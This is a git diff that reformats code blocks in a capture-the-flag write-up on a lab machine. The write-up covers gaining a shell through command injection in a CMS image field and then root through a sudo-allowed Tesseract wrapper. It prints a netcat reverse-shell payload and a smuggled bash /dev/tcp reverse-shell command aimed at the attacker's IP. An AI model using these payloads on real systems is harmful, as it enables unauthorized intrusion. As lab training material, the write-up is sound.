@@ -25,9 +25,9 @@ We see port **22** (SSH) and port **80** (HTTP)
 We visit the http website (port 80)
 We are prompted to the login page for the CMS
 
-```
+`
 http://[TARGET_IP]/login.php
-```
+`
 
 Now, we need to find the default username and password for the cms which is easy through a quick online search *(or brute force it, but in this situation it is not needed)*
 
@@ -83,18 +83,24 @@ Now, we need to set up a reverse shell, which is done like this:
 
 Open the bash console and type
 
-```nc -nlvp [YOUR_PORT]```
+```
+nc -nlvp [YOUR_PORT]
+```
 
 Then, in the url of the image (*which can be copy+pasted from the page source*), we insert this payload to get a reverse shell    
 
-` cmd= nc -e /bin/bash [YOUR_IP] [YOUR_PORT]`
+```
+cmd= nc -e /bin/bash [YOUR_IP] [YOUR_PORT]
+```
 
 After we've successfully created a reverse shell, we need to see how we can escalate our privileges to root.
 
 ### Step Four: Getting Root
 
 if we run 
-`sudo -l`
+```
+sudo -l
+```
 
 the server returns a script
 
@@ -105,7 +111,9 @@ We can leverage this for privilege escalation.
 
 I wrote a simple bash script for this:
 
-`sudo /usr/local/bin/tsract "; bash -c 'bash -i >& /dev/tcp/[YOUR_IP]/[YOUR_PORT] 0>&1'; #"`
+```
+sudo /usr/local/bin/tsract "; bash -c 'bash -i >& /dev/tcp/[YOUR_IP]/[YOUR_PORT] 0>&1'; #"
+```
 
 ***The underlying cause of the vulnerability can be researched further online for detailed technical insights. TL;DR is that the package uses child_process (e.g., exec() or spawn()) to execute Tesseract commands. It appends the image filename provided by the user directly to the command without sanitization.***
 
@@ -125,8 +133,6 @@ From a defensive standpoint, implementing strong security practices such as rest
 While this challenge was completed in a controlled environment, similar techniques could have devastating effects on real-world systems. Ethical hacking and responsible disclosure are key to ensuring such vulnerabilities are mitigated before they are exploited by malicious actors.
 
 PS: 
-```
-[YOUR_IP]= Your VPN IP 
+`[YOUR_IP]= Your VPN IP 
 [YOUR_PORT]= Custom port to use for netcat
-[TARGET_IP]= IP of the machine you are hacking 
-```
+[TARGET_IP]= IP of the machine you are hacking`
